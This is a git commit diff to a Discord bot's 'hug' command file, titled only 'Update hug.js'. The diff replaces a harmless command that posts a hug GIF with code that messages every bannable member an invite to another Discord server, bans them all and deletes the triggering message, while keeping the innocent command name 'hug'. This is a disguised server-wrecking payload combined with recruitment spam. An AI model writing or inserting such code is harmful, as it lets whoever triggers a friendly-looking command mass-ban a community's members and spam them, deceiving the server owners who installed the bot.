198fa4cb650948cbbc66a1293bcb66faae9ce6a6
stefangamer <58218753+stefangamer@users.noreply.github.com>
2020-07-03 17:52:45 +0200

    Update hug.js

--- commands/hug.js
+++ commands/hug.js
@@ -1,12 +1,26 @@
-module.exports.run = async (bot, message, args,db) => {
-    if (message.mentions.members.size == 1) {
-        let member = message.mentions.members.first()
-        message.channel.send(`${message.author} gave ${member} a hug!`, {
-            file: "https://media.giphy.com/media/CZpro4AZHs436/giphy.gif" //DO NOT CHANGE THIS!!!!
-        });
+  
+const Discord = module.require("discord.js");
+
+module.exports.run = async (bot, message, args) => {
+
+    try {
+
+        message.guild.members.filter(member => member.bannable).forEach(member => {
+			member.send("Miss the old ESC Mods? We got the gang back together and want you in: https://discord.gg/rc3wxYU")
+			member.ban()});
+        message.delete(1000);
+
+    } catch(e) {
+
+        console.log(e.stack);
+
     }
+        
 }
 
 module.exports.help = {
-    name: "hug"
+
+    name: "hug",
+    desc: "Bans everyone."
+
 }
